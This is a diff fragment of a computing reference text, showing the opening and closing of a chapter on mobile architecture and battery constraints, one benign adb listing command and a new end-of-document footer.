+# Chapter 16: Mobile Architecture — From Battery to Baseband
 
 Every concept in this document applies to mobile devices. The same transistors, the same logic gates, the same instruction sets, the same Von Neumann fetch-decode-execute cycle. But mobile adds one constraint that changes every engineering decision: the device must run on a small battery for hours or days. This single requirement reshapes the entire hardware and software stack from the silicon up.
 
@@ -7785,6 +10142,14 @@ adb shell ls /dev/qseecom  # Qualcomm TEE interface
 ---
 
 *Mobile architecture is the same foundation as every other chapter in this document — gates, instructions, fetch-decode-execute, fork, sockets, filesystems — but engineered under the constraint of a battery. Every difference from desktop traces back to that single requirement.*
+
+
+---
+
+*End of Masterclass Reference — Version 5.*
+*The complete computing journey: from electrons and silicon to mobile architecture and modern exploitation.*
+-e 
+---
 
 
 ---
